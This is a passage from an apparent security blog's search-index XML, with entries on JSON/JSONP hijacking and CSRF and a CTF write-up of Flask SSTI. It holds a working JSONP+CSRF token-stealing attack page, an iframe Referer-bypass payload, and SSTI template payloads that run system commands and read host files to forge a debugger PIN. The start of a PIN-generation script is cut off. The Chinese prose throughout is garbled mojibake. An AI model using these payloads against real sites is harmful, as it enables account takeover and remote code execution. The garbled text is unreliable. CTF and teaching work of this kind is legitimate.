ç”¨èµ„æºå°‘ï¼›è€Œè™šæ‹Ÿæœºå¯åŠ¨é€Ÿåº¦æ…¢ï¼Œæ¶ˆè€—èµ„æºå¤šã€‚<br>è¿™é‡Œå¼•ç”¨ä¸¤å¥è¯ï¼Œæ„Ÿè§‰è¯´çš„éå¸¸å¥½ï¼š<br>â€œå…¶å®æœ€å¤§çš„åŒºåˆ«åœ¨äºåº”ç”¨åœºæ™¯çš„ä¸åŒï¼šè™šæ‹Ÿæœºæœ€å¼€å§‹å‡ºç°æ˜¯ä¸ºäº†æ¨¡æ‹Ÿä¸åŒçš„ç¡¬ä»¶å¹³å°ï¼Œä½†æ˜¯ç°åœ¨äº‘è®¡ç®—æ—¶ä»£æ˜¯ä¸ºäº†æä¾›çš„è®¡ç®—èƒ½åŠ›çš„è™šæ‹ŸåŒ–ï¼Œè¿™æ ·å¯ä»¥å¿«é€Ÿçµæ´»çš„åˆ’åˆ†å’Œåˆ†é…è®¡ç®—èµ„æºã€‚å®¹å™¨åˆ™æ˜¯éšç€åº”ç”¨ç¨‹åºçš„æ¶æ„å‘å±•æ‰€è‡ªç„¶è¡ç”Ÿå‡ºæ¥çš„ä¸œè¥¿ã€‚å½“è½¯ä»¶è¶Šæ¥è¶Šå¤æ‚ï¼Œå•ä½“åº”ç”¨æ²¡æ³•å†å‘å±•ä¸‹å»äº†ï¼Œæ¯ä¸ªåŠŸèƒ½é€æ¸ç‹¬ç«‹å‡ºæ¥ï¼Œå‡ºç°é¢å‘æœåŠ¡çš„æ¶æ„ï¼Œè¿›è€Œå‡ºç°æ‰€è°“å¾®æœåŠ¡çš„æ¶æ„ã€‚â€œ</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSON&amp;JSONP&amp;CSRF</title>
      <link href="2020/05/22/JSON-JSONP-CSRF/"/>
      <url>2020/05/22/JSON-JSONP-CSRF/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://cloud.tencent.com/developer/article/1516219">https://cloud.tencent.com/developer/article/1516219</a><br><a href="https://blog.csdn.net/u011089760/article/details/93550458">https://blog.csdn.net/u011089760/article/details/93550458</a><br><a href="https://blog.csdn.net/qq_37133717/article/details/105749589">https://blog.csdn.net/qq_37133717/article/details/105749589</a><br><a href="https://blog.csdn.net/tianjindong0804/article/details/84971922">https://blog.csdn.net/tianjindong0804/article/details/84971922</a><br><a href="https://archive.phocean.net/2013/10/13/csrf-with-jsonp.html">https://archive.phocean.net/2013/10/13/csrf-with-jsonp.html</a></p><h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>è°ˆjsonpä¹‹å‰ï¼Œé¦–å…ˆæ˜ç™½ä»€ä¹ˆæ˜¯jsonã€‚<br>jsonå…¨ç§°JavaScript Object Notationï¼ŒJSå¯¹è±¡æ ‡è®°ï¼Œæ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢æ–¹å¼ï¼ŒJSONæœ€å¸¸ç”¨çš„æ˜¯å¯¹è±¡çš„é”®å€¼å¯¹ï¼Œæœ‰ç‚¹åƒpythonä¸­dictæ•°æ®ç»“æ„ã€‚<br>ä¾‹å¦‚{â€œk1â€:â€v1â€,â€k2â€:â€v2â€}</p><h2 id="JSON-Hijacking"><a href="#JSON-Hijacking" class="headerlink" title="JSON Hijacking"></a>JSON Hijacking</h2><p>JSONåŠ«æŒé€šè¿‡è¯±å¯¼ç”¨æˆ·ç‚¹å‡»æ¶æ„æ–‡ä»¶ï¼Œé‡å†™Array()æ„é€ å‡½æ•°çš„æ–¹æ³•ï¼Œå°†jsonæ•°æ®å‘é€ç»™æ”»å‡»è€…ã€‚<br>JSONåŠ«æŒæ­¥éª¤ï¼ˆå‚è€ƒï¼‰<br>1ï¼‰é‡æ–°å®šä¹‰æ•°ç»„æ„é€ å‡½æ•°Array = function() å¹¶å°†æ•°ç»„èµ‹å€¼ç»™æˆ‘ä»¬å®šä¹‰çš„å…¨å±€å˜é‡ï¼›</p><p>2ï¼‰å‘ç›®æ ‡ç½‘ç«™å‘é€ä¸€æ¡è¯·æ±‚ï¼Œå€Ÿç”¨è¢«æ”»å‡»è€…çš„sessionæƒé™ï¼›</p><p>3ï¼‰å°†è·å¾—çš„æ•°æ®èµ‹ç»™yourDataï¼Œä»è€Œè¿›è¡Œä»»æ„å¤„ç†ã€‚</p><p>å…¶ä¸­ç¬¬ä¸€æ­¥çš„å‡½æ•°è¦†ç›–æ˜¯å…³é”®ï¼Œå¯ä»¥JSä¸­çš„æ–¹æ³•è¦†ç›–çš„ç‰¹æ€§æˆ–è€…ä½¿ç”¨JSçš„ç‰¹æ®Šæ–¹æ³•Object.prototype.__defineSetter__ç­‰ã€‚ï¼ˆè¿™ä¸ªå‡½æ•°åœ¨æ–°ç‰ˆchromeå’Œfirefoxå·²å¤±æ•ˆã€‚ï¼‰</p><h1 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h1><p>ä»€ä¹ˆæ˜¯JSONPï¼ŸJSONPæ˜¯å¸¦æœ‰å¡«å……ï¼ˆPaddingï¼‰çš„JSONæ•°æ®ã€‚<br>JSONPä¸ºäº†è§£å†³è·¨åŸŸé—®é¢˜ï¼Œæˆ‘ä»¬çŸ¥é“ï¼ŒJS,XHR(AJAX)å¯ä»¥å‘èµ·è·¨åŸŸè¯·æ±‚ï¼Œä½†æ˜¯æ‹¿ä¸åˆ°è·¨åŸŸè¯·æ±‚çš„èµ„æºï¼ˆæˆ–è€…è¯´çœ‹ä¸åˆ°å“åº”ã€æ‹¿ä¸åˆ°å“åº”æ•°æ®ï¼‰</p><img src="http://cdn.polowong.top/static/images/jsonp1.png"><p>JSONPæœ€å¤§çš„ç‰¹å¾æ˜¯å›ä¼ ã€‚<br>ä½¿ç”¨æ–¹æ³•ä¸ºåœ¨é¡µé¢ä¸­åŠ å…¥&lt;script&gt;æ ‡ç­¾,srcå±æ€§ä¸ºè¯·æ±‚çš„JSèµ„æºçš„URLï¼Œæœ€ååŠ ä¸Šå›è°ƒå‡½æ•°çš„åç§°ï¼Œæ¯”å¦‚<br>è¯·æ±‚URLä¸ºï¼š<a href="http://www.test.io/1.php?callback=cb">www.test.io/1.php?callback=cb</a><br>ç„¶ååœ¨å½“å‰é¡µé¢éœ€è¦å†™ä¸€ä¸ªJSå‡½æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">alert(data.username)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¾ä¸ªä¾‹å­ï¼š<br>å‰ç«¯é¡µé¢ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">Â Â <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">title</span>&gt;</span>hack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â <span class="function"><span class="keyword">function</span> <span class="title">resolveJson</span>(<span class="params">result</span>) </span>&#123; <span class="comment">//æµè§ˆå™¨ç«¯ä»£ç </span></span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â alert(result.name);</span><br><span class="line">Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://test2.io/jsonp.php?callback=resolveJson&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Â Â <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">Â Â <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Â Â <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åç«¯å¤„ç†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;alsy&quot;</span>, <span class="string">&quot;age&quot;</span> =&gt; <span class="string">&quot;20&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&quot;</span>. json_encode(<span class="variable">$arr</span>) .<span class="string">&quot;);&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœï¼š<img src="http://cdn.polowong.top/static/images/jsonp.jpg"></p><h2 id="JSONPæ³¨å…¥"><a href="#JSONPæ³¨å…¥" class="headerlink" title="JSONPæ³¨å…¥"></a>JSONPæ³¨å…¥</h2><p>ç”±äºä¼ çš„callbackå†…å®¹æ˜¯è‡ªå®šä¹‰çš„ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå¯¼è‡´XSSï¼ˆè¿”å›åŒ…content-typeä¸ºtext/htmlçš„è¯ï¼‰<br>å¦‚ä¼ å…¥çš„?callback=callback=alert(â€˜xssâ€™)</p><img src="http://cdn.polowong.top/static/images/jsonp1.jpg"><h2 id="JSONPåŠ«æŒ"><a href="#JSONPåŠ«æŒ" class="headerlink" title="JSONPåŠ«æŒ"></a>JSONPåŠ«æŒ</h2><p>JSONPåŠ«æŒçš„ç›®çš„æ˜¯ç›—å–ç”¨æˆ·æ•æ„Ÿæ•°æ®ï¼Œæˆ–è€…æ‹¿åˆ°tokenè¿›è¡ŒCSRFåˆ©ç”¨<br>JSONåŠ«æŒä¸JSONPæ³¨å…¥çš„å¼‚åŒï¼š<br>åŒ:éƒ½å¯ä»¥åŠ«æŒç”¨æˆ·æ•°æ®ï¼Œç›—å–æ•æ„Ÿä¿¡æ¯ï¼ŒæŒ‚é©¬ç­‰æ“ä½œ<br>å¼‚ï¼šjsonpè¿”å›çš„æ•°æ®æœ‰callbackå‡½æ•°ååŒ…è£¹ã€‚<br>jsonpæ³¨å…¥è¿˜å¯ä»¥é€ æˆxssã€‚</p><h3 id="JSONPåŠ«æŒæµç¨‹"><a href="#JSONPåŠ«æŒæµç¨‹" class="headerlink" title="JSONPåŠ«æŒæµç¨‹"></a>JSONPåŠ«æŒæµç¨‹</h3><p>1.ç”¨æˆ·ç™»å½•å­˜åœ¨JSONPåŠ«æŒçš„ç½‘ç«™ï¼Œé€šå¸¸å‚æ•°å­˜åœ¨callback æˆ–è€…htmlback<br>2.ç”¨æˆ·æºå¸¦èº«ä»½ä¿¡æ¯è®¿é—®æ”»å‡»è€…ç¼–å†™çš„é¡µé¢ã€‚<br>3.æ”»å‡»è€…ç¼–å†™çš„é¡µé¢è‡ªå®šä¹‰äº†callbackå‡½æ•°åï¼Œå¹¶ä¸”é€šè¿‡scriptæ ‡ç­¾åƒç”¨æˆ·éšç§æ•°æ®å‘èµ·è¯·æ±‚ï¼ˆè¿™é‡Œéœ€è¦ç”¨åˆ°ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼‰<br>4.ç”¨æˆ·è®¿é—®æ”»å‡»é¡µé¢åï¼Œæºå¸¦èº«ä»½ä¿¡æ¯è®¿é—®æ”»å‡»è€…æŒ‡å®šçš„JSONPæ•°æ®ï¼Œå¹¶ä¸”åœ¨å½“å‰æ”»å‡»é¡µé¢çš„å›è°ƒå‡½æ•°ä¸­å®Œæˆæ“ä½œï¼ˆè¯¥æ“ä½œå¯èƒ½æ˜¯å‘é€éšç§ä¿¡æ¯ç»™æ”»å‡»è€…ï¼Œä¹Ÿå¯èƒ½æ˜¯æ‹¿tokenè¿›è¡Œcsrfï¼‰</p><img src="http://cdn.polowong.top/static/images/jsonp2.jpg"><p>#JSONPä¸CSRF<br>æ€è·¯ï¼šé€šè¿‡JSONPå¾—åˆ°é¡µé¢çš„tokenï¼Œç„¶åç”Ÿæˆè¡¨å•ï¼Œå†™ä¸Štokenï¼Œå‘é€è¯·æ±‚ã€‚æ”»å‡»é¡µé¢ä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">obj</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// è·å–å¯¹è±¡ä¸­çš„å±æ€§å€¼</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> content = obj[<span class="string">&#x27;html&#x27;</span>]</span></span><br><span class="line"><span class="javascript">    <span class="comment">// æ­£åˆ™åŒ¹é…å‡ºå‚æ•°å€¼</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> token=content.match(<span class="string">&#x27;token = &quot;(.*?)&quot;&#x27;</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">    <span class="comment">// æ·»åŠ è¡¨å•èŠ‚ç‚¹</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> parent=<span class="built_in">document</span>.getElementById(<span class="string">&quot;test&quot;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> child=<span class="built_in">document</span>.createElement(<span class="string">&quot;form&quot;</span>);</span></span><br><span class="line"><span class="javascript">    child.method=<span class="string">&quot;POST&quot;</span>;</span></span><br><span class="line"><span class="javascript">    child.action=<span class="string">&quot;http://vuln.com/del.html&quot;</span>;</span></span><br><span class="line"><span class="javascript">    child.id=<span class="string">&quot;test1&quot;</span></span></span><br><span class="line">    parent.appendChild(child);</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> parent_1=<span class="built_in">document</span>.getElementById(<span class="string">&quot;test1&quot;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> child_1=<span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span></span><br><span class="line"><span class="javascript">    child_1.type=<span class="string">&quot;hidden&quot;</span>;child_1.name=<span class="string">&quot;token&quot;</span>;child_1.value=token;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> child_2=<span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span></span><br><span class="line"><span class="javascript">    child_2.type=<span class="string">&quot;submit&quot;</span>;</span></span><br><span class="line">    parent_1.appendChild(child_1);</span><br><span class="line">    parent_1.appendChild(child_2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://vuln.com/caozuo.html?htmlcallback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å®ç°JSONP+CSRFæœ‰äº›éš¾åº¦ï¼Œé¦–å…ˆéœ€è¦å­˜åœ¨jsonpåŠ«æŒï¼Œå…¶æ¬¡èƒ½åœ¨æºç é‡Œæ‰¾åˆ°tokenï¼Œæœ€åéœ€è¦ç»•è¿‡refereré™åˆ¶ã€‚</p><h2 id="refererç»•è¿‡ç­–ç•¥ï¼š"><a href="#refererç»•è¿‡ç­–ç•¥ï¼š" class="headerlink" title="refererç»•è¿‡ç­–ç•¥ï¼š"></a>refererç»•è¿‡ç­–ç•¥ï¼š</h2><h3 id="1-ç©ºreferrer"><a href="#1-ç©ºreferrer" class="headerlink" title="1.ç©ºreferrer:"></a>1.ç©ºreferrer:</h3><p>åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œå¼€å‘è€…åœ¨éƒ¨ç½²è¿‡æ»¤ Referer æ¥æºæ—¶ï¼Œå¿½è§†äº†ä¸€ä¸ªç©º Referer çš„è¿‡æ»¤ã€‚ä¸€èˆ¬æƒ…å†µä¸‹æµè§ˆå™¨ç›´æ¥è®¿é—®æŸ URL æ˜¯ä¸å¸¦ Referer çš„ï¼Œæ‰€ä»¥å¾ˆå¤šé˜²å¾¡éƒ¨ç½²æ˜¯å…è®¸ç©º Referer çš„ã€‚æ°æ°ä¹Ÿå°±æ˜¯è¿™ä¸ªå¿½è§†ï¼Œå¯¼è‡´äº†æ•´ä¸ªé˜²å¾¡çš„å¥”æºƒã€‚å› ä¸ºåœ¨é€šè¿‡è·¨åè®®è°ƒç”¨ js æ—¶ï¼Œå‘é€çš„ http è¯·æ±‚é‡Œ Referer ä¸ºç©ºï¼ è·¨åè®®è°ƒç”¨çš„ä¸€ä¸ªç®€å•ä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;javascript:&#39;&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;http:&#x2F;&#x2F;www.qq.com&#x2F;login.php?calback&#x3D;JSON&gt;&lt;&#x2F;script&gt;&#39;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><p>ä»£ç é‡Œæˆ‘ä»¬ä½¿ç”¨ <iframe> è°ƒç”¨ javscript ä¼ªåè®®æ¥å®ç°ç©º Referer è°ƒç”¨ JSON æ–‡ä»¶ã€‚<br>ï¼ˆå‚è€ƒè‡ªçŸ¥é“åˆ›å®‡<a href="https://blog.knownsec.com/2015/03/jsonp_security_technic/%EF%BC%89">https://blog.knownsec.com/2015/03/jsonp_security_technic/ï¼‰</a></p><h3 id="2-ç»•è¿‡referrerçš„æ­£åˆ™"><a href="#2-ç»•è¿‡referrerçš„æ­£åˆ™" class="headerlink" title="2.ç»•è¿‡referrerçš„æ­£åˆ™"></a>2.ç»•è¿‡referrerçš„æ­£åˆ™</h3><p>æœ‰äº›refererçš„æ­£åˆ™å†™çš„ä¸å¤ªè¡Œï¼Œå¯ä»¥ç»•è¿‡ã€‚ã€‚ä¸è¿‡ä¼°è®¡ç°ä»£ç½‘ç«™åº”è¯¥æ¯”è¾ƒå®Œå–„äº†</p><h1 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h1><h2 id="ä¸¥æ ¼å®šä¹‰-Content-Type-application-json"><a href="#ä¸¥æ ¼å®šä¹‰-Content-Type-application-json" class="headerlink" title="ä¸¥æ ¼å®šä¹‰ Content-Type: application / json"></a>ä¸¥æ ¼å®šä¹‰ Content-Type: application / json</h2><p>è¿™æ ·å¯ä»¥é˜²æ­¢XSS</p><h2 id="å®Œå–„refererè¿‡æ»¤è§„åˆ™"><a href="#å®Œå–„refererè¿‡æ»¤è§„åˆ™" class="headerlink" title="å®Œå–„refererè¿‡æ»¤è§„åˆ™"></a>å®Œå–„refererè¿‡æ»¤è§„åˆ™</h2><h2 id="è¿‡æ»¤JSONçš„æ•°æ®è¾“å‡º"><a href="#è¿‡æ»¤JSONçš„æ•°æ®è¾“å‡º" class="headerlink" title="è¿‡æ»¤JSONçš„æ•°æ®è¾“å‡º"></a>è¿‡æ»¤JSONçš„æ•°æ®è¾“å‡º</h2>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†è°ˆflask-ssti</title>
      <link href="2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/"/>
      <url>2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿›ä¸€æ­¥ç†è§£flask-ssti"><a href="#è¿›ä¸€æ­¥ç†è§£flask-ssti" class="headerlink" title="è¿›ä¸€æ­¥ç†è§£flask-ssti"></a>è¿›ä¸€æ­¥ç†è§£flask-ssti</h1><p>sstiçš„ç›®çš„ï¼š<br>1.è¯»å–æ–‡ä»¶ï¼ˆLFI,è·å–secret key ä¼ªé€ sessionï¼‰<br>2.RCE </p><h2 id="BUUOJ-FLASK-APP-é¢˜ç›®åˆ†æ"><a href="#BUUOJ-FLASK-APP-é¢˜ç›®åˆ†æ" class="headerlink" title="BUUOJ FLASK-APP é¢˜ç›®åˆ†æ"></a>BUUOJ FLASK-APP é¢˜ç›®åˆ†æ</h2><p>å…ˆçœ‹çœ‹æç¤ºï¼Œæç¤ºäº†PIN</p><h3 id="ç¬¬ä¸€ç§åšæ³•ï¼š"><a href="#ç¬¬ä¸€ç§åšæ³•ï¼š" class="headerlink" title="ç¬¬ä¸€ç§åšæ³•ï¼š"></a>ç¬¬ä¸€ç§åšæ³•ï¼š</h3><p>å‚è€ƒé“¾æ¥<a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a><br>ç®€å•åœ°è¯´å°±æ˜¯flask app åœ¨debugæ¨¡å¼ä¸‹é€šè¿‡terminalæ˜¾ç¤ºçš„pinç å¯ä»¥åœ¨æŠ¥é”™çš„æ—¶å€™è¿›å…¥python shellã€‚å¹¶ä¸”è¿è¡Œåº”ç”¨ç¨‹åºæ—¶è¯¥pinç ä¸ä¼šå˜ã€‚<br>æ¥ä¸‹æ¥éœ€è¦çŸ¥é“ç”ŸæˆPINç éœ€è¦ä»€ä¹ˆã€‚<br>1.å½“å‰ç”¨æˆ·å<br>2.app.pyçš„ç»å¯¹è·¯å¾„<br>3.model name ä¸€èˆ¬æ˜¯flask.app<br>4.appåç§° ä¸€èˆ¬æ˜¯Flask<br>5.ç½‘å¡åè¿›åˆ¶æ•°ï¼ˆæœåŠ¡å™¨çš„ï¼Œè¯»/sys/class/net/eth0/addressï¼‰<br>6.machine-idï¼ˆdockerçš„è¯éœ€è¦è¯»å–/proc/self/cgroup ï¼Œæ­£å¸¸Linuxè¯»å–/etc/machine-idï¼‰<br>é‚£ä¹ˆæ¥ä¸‹æ¥å°±éœ€è¦è·å–è¿™äº›ã€‚<br>é¦–å…ˆæ˜¯app.pyçš„ç»å¯¹è·¯å¾„ï¼Œé€šè¿‡æŠ¥é”™è·å¾—ï¼š</p><img src="http://cdn.polowong.top/static/images/bypass4.jpg"><p>/usr/local/lib/python3.7/site-packages/flask/app.py<br>ç„¶åæ˜¯å½“å‰ç”¨æˆ·åï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œæˆ‘ç”¨çš„æ˜¯ç¬¬ä¸€ç§ï¼Œé€šè¿‡ssti è¯»æ–‡ä»¶/etc/passwd å‘ç°ç”¨æˆ·flaskwebï¼ŒçŒœæµ‹å°±æ˜¯è¿™ä¸ªç”¨æˆ·<br>å¦ä¸€ç§å‡†ç¡®çš„æ–¹æ³•æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ç»•è¿‡os popenè¿‡æ»¤ æ–¹æ³•æ˜¯æ‹¼æ¥å­—ç¬¦ä¸² ç”¨å•å¼•å·ã€‚åŒå¼•å·ä¼šå¤±è´¥ ä¸çŸ¥é“ä¸ºä»€ä¹ˆ<br>çœ‹åˆ°å½“å‰ç”¨æˆ·æ˜¯flaskwebã€‚<br>æ¥ä¸‹æ¥è¯»å–ç½‘å¡åè¿›åˆ¶ä¸machine-id ç”±äºbuuojæ˜¯dockerç¯å¢ƒï¼Œæ‰€ä»¥éœ€è¦ä»/proc/self/cgroupè¯»ã€‚<br>ç½‘å¡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>02:42:ae:01:5e:21 è½¬åè¿›åˆ¶ä¸ç”¨è¯´äº†ã€‚2485410422305<br>machine-idï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf</span><br></pre></td></tr></table></figure><p>ç”ŸæˆPINç çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    